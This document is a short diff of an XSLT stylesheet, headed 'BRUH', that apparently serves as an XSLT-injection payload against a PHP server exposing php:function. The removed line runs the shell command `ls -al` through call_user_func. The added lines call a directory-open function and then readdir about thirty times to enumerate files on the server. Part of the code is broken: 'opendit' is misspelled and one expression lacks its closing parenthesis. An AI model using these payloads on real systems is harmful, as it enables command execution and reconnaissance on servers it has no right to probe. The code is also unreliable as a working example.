@@ -7,7 +7,37 @@
 			<h3>BRUH</h3>
 			<ul>
 				<li>
-					<xsl:value-of select="php:function('call_user_func', function(){return `ls -al`;}"/>
+					<xsl:value-of select="php:function('opendit', '.'"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
+					<xsl:value-of select="php:function('readdir')"/>
 				</li>
 			</ul>
 		</body>
